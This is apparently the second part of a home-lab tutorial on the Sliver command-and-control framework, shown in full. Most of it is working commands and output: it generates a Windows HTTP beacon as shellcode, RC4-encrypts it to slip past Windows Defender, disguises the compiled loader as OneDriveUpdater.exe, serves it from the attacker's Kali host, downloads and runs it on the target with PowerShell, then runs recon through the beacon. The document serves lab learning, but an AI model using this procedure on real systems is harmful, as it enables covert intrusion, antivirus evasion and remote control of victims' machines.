# Part 2 - Using Sliver C2 client/server and Alternate AV bypass

## **Intro**
In this part, we will be using silver server and client feature to show how the multi user feature works and can be used as a singlee user to avoid client crashes/hangs from affecting the sliver server.

We will use a [AV bypass method from my repo "av-bypass"](https://github.com/jjkirn/av-bypass) to bypass Windows Defender to get the sliver implant to our lab Windows Worstation target - WS0. 

## **Note:**
Be aware that the "av-bypass" method described in that repo is complicated by the fact that you need to create a "Windows Studio 2022" development environment to compile some C+ code to create the obsuscated implant code. If you think this is too complicated and just want to see how sliver client/server works, refer the to steps oulined in [part 1](/notes/part1.md) to turn off Windows Defender.

---
## **Getting Started**
On Kali VM, open terminal window and run the sliver server:
```
┌──(jim㉿kali)-[~/Desktop]
└─$ cd sliver-c2                                                                                                 
┌──(jim㉿kali)-[~/Desktop/sliver-c2]
└─$ /opt/sliver/sliver-server  
[*] Loaded 2 aliases from disk
[*] Loaded 39 extension(s) from disk


          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███                                                                                 
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒                                                                               
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒                                                                               
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄                                                                                 
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒                                                                               
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░                                                                               
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░                                                                               
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░                                                                                
                  ░      ░  ░ ░        ░     ░  ░   ░                                                                                
                                                                                                                                     
All hackers gain reinforce
[*] Server v1.5.37 - 8a9437c99ab98f8afe1abfafd6a57cd7bd4ade28
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver >  

```

Create a new operator:
```
[server] sliver > new-operator --name jim --lhost localhost

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /home/jim/Desktop/sliver-c2/jim_localhost.cfg 

[server] sliver >  

```

Put sliver server into multipayer mode:
```
[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver >  

```

---
It is recommended to run both the server and client on the same VM. The advantage of the client/server is if you kill the client the server still runs, you can always reconnect with client.

Open a second terminal window for the Client activites and copy the config generated by the sliver-server to the default location that the client expects:
```
┌──(jim㉿kali)-[~/Desktop]
└─$ cp  /home/jim/Desktop/sliver-c2/jim_localhost.cfg /home/jim/.sliver-client/configs/
```

Now launch the sliver client:
```
┌──(jim㉿kali)-[~/Desktop]
└─$ /opt/sliver/sliver-client                                                                                
Connecting to localhost:31337 ...
[*] Loaded 2 aliases from disk
[*] Loaded 39 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗                                                                                       
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗                                                                                      
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝                                                                                      
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗                                                                                      
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║                                                                                      
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝                                                                                      
                                                                                                                                      
All hackers gain living weapon
[*] Server v1.5.37 - 8a9437c99ab98f8afe1abfafd6a57cd7bd4ade28
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  
```

---
Time to generate our beacon code.

Below are steps from [My repo "av-bypass"](https://github.com/jjkirn/av-bypass) to create the beacon implant for this Lab.

```
sliver > generate beacon --seconds 30 --jitter 33 --os windows --arch amd64 --format shellcode --http 192.168.175.130 --name wutai-http --save /tmp/http.bin -G --skip-symbols

[*] Generating new windows/amd64 beacon implant binary (30s)
[!] Symbol obfuscation is disabled
[*] Build completed in 4s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /tmp/http.bin
```
In another Kali terminal window go to /tmp:
```
┌──(jim㉿kali)-[~/Desktop]
└─$ cd /tmp
┌──(jim㉿kali)-[/tmp]
└─$ ls       
http.bin
```

Get the rc4.py from [my av-bypass repo](https://github.com/jjkirn/av-bypass) - (encrypt using rc4)
```
┌──(jim㉿kali)-[/tmp]
└─$ ls       
http.bin
rc4.py
```

Encrypt the code, set key = advapi32.dll to avoid looking suspicious
```
┌──(jim㉿kali)-[/tmp]
└─$ python3 rc4.py advapi32.dll http.bin
Written http.bin.enc
```

Now have the RC4 encypted output
```
┌──(jim㉿kali)-[/tmp]
└─$ ls
http.bin
http.bin.enc
rc4.py
```

Now we need to convert the http.bin.enc file output to a data format needed for the Windows compliler
```
┌──(jim㉿kali)-[/tmp]
└─$ hexdump -v -e '1/2 "dw 0%.4xh\n"' http.bin.enc | tee out.txt
dw 04511h
dw 02e1dh
dw 0b721h
...
[snip]
```

You will get a large file containing data in the form "dw 0b6b2h" that we will put into an assmbly file which will be moved over to the "Windows 11 dev machine" to be compliled along with the other code from the av-bypass repo.
```
┌──(jim㉿kali)-[/tmp]
└─$ ls -la 
total 75056
drwxrwxrwt 15 root root     4096 Jun  3 19:12 .
drwxr-xr-x 19 root root     4096 Apr 25 23:41 ..
-rwx------  1 jim  jim  10967772 Jun  3 18:54 http.bin
-rw-r--r--  1 jim  jim  10967772 Jun  3 19:05 http.bin.enc
-rw-r--r--  1 jim  jim  54838860 Jun  3 19:13 out.txt
-rw-r--r--  1 jim  jim       732 Jun  3 19:05 rc4.py
```

Notice that "out.txt" is around 54 MB, a really big assembly file

---
In Part 2 of [my av-bypass repo](https://github.com/jjkirn/av-bypass) it tells you how to build a Windows 11 dev machine. On that machine, you copy the contents of the Kali "out.txt" file to a Windows Visual Studio project as "data.asm" file. The Visual Studio project files are also located in that repo.

Now on the Windows 11 dev manchine. Compile the project. The output will be located in the x64/Release directory.

```
PS C:\Users\jim> cd C:\Users\jim\source\repos\wutai_loader\x64\Release

PS C:\Users\jim\source\repos\wutai_loader\x64\Release> ls

    Directory: C:\Users\jim\source\repos\wutai_loader\x64\Release

Mode                LastWriteTime        Length Name
----                -------------        ------ ----
-a----        5/18/2023  12:39 PM      10980352 wutai_loader.exe
-a----        5/18/2023  12:40 PM         69224 wutai_loader.pdbdi
```

---
Back on Kali VM.

Copy the "wutai_loader.exe" file to the Kali machine at the "www" directory and rename it OneDriveUploader.exe
```
┌──(jim㉿kali)-[~/Desktop/active_directory/hacks/www]
└─$ mv wutai_loader.exe OneDriveUpdater
┌──(jim㉿kali)-[~/Desktop/active_directory/hacks/www]
└─$ ls
OneDriveUploader.exe
```

Run a python web server on that directory:
```
┌──(jim㉿kali)-[~/Desktop/active_directory/hacks/www]
└─$ sudo python3 -m http.server 80
[sudo] password for jim: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

---
Switch to the Windows Worstation target (WS01) and download the implant!
```
open command window
cd C:\windows\tasks
C:\windows\tasks>powershell
PS C:\Wndows\Tasks> iwr http://192.168.175.130/OneDriveUpdater.exe -o OneDriveUpdater.exe
```

Execute the implant
```
.\OneDriveUpdater.exe
```

---
Back on Kali VM, using our Sliver-client window, should now see a call back from the beacon!
```
sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #2

[*] Beacon 7e5b25a2 wutai-http - 192.168.175.132:50656 (ws01) - windows/amd64 - Sun, 04 Jun 2023 18:52:56 CDT

sliver > jobs

 ID   Name   Protocol   Port  
==== ====== ========== =======
 1    grpc   tcp        31337 
 2    http   tcp        80    
 ```

Select our beacon call back:
```
sliver > use 7e5b

[*] Active beacon wutai-http (7e5b25a2-3489-445e-affb-fd323f3430ec)

sliver (wutai-http) > interactive

[*] Using beacon's active C2 endpoint: https://192.168.175.130
[*] Tasked beacon wutai-http (6e2c27f6)

sliver (wutai-http) > ls

[*] Tasked beacon wutai-http (96eec112)

[+] wutai-http completed task 96eec112

C:\Windows\Tasks (3 items, 10.5 MiB)
====================================
-rw-rw-rw-  CreateExplorerShellUnelevatedTask.job  214 B     Mon May 01 18:46:21 -0700 2023
-rw-rw-rw-  OneDriveUploader.exe                   10.5 MiB  Thu May 18 13:37:03 -0700 2023
-rw-rw-rw-  SA.DAT                                 6 B       Sun Jun 04 14:56:29 -0700 2023


[*] Session f24b05a6 wutai-http - 192.168.175.132:50676 (ws01) - windows/amd64 - Sun, 04 Jun 2023 18:55:32 CDT
```

Run a few basic recon commands:
```
sliver (wutai-http) > whoami

Logon ID: XYZ\alice
[*] Tasked beacon wutai-http (964eff62)

[+] wutai-http completed task 964eff62

sliver (wutai-http) > ifconfig

[*] Tasked beacon wutai-http (a59160bb)

[+] wutai-http completed task a59160bb

+-------------------------------------------+
| Bluetooth Network Connection              |
+-------------------------------------------+
| # | IP Addresses      | MAC Address       |
+---+-------------------+-------------------+
| 5 | 169.254.75.145/16 | d8:5d:e2:de:37:08 |
+-------------------------------------------+

+--------------------------------------------+
| Ethernet0                                  |
+--------------------------------------------+
| # | IP Addresses       | MAC Address       |
+---+--------------------+-------------------+
| 6 | 192.168.175.132/24 | 00:0c:29:25:ff:00 |
+--------------------------------------------+
1 adapters not shown.
```
---
End of Part 2.


